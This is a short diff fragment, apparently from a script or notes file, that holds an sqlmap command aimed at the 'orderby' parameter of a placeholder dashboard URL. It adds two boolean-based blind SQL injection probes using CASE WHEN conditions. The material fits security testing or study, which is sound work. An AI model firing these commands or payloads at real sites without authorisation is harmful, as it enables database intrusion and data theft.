@@ -238,3 +238,5 @@ if __name__ == "__main__":
 
 
 sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" --cookie="PHPSESSID=your_token" -p orderby --technique=TB --level=3 --risk=2 --dbms=mysql --batch
+?orderby=(CASE+WHEN+(1=1)+THEN+id+ELSE+name+END)&order=ASC
+?orderby=(CASE+WHEN+(1=2)+THEN+id+ELSE+name+END)&order=ASC
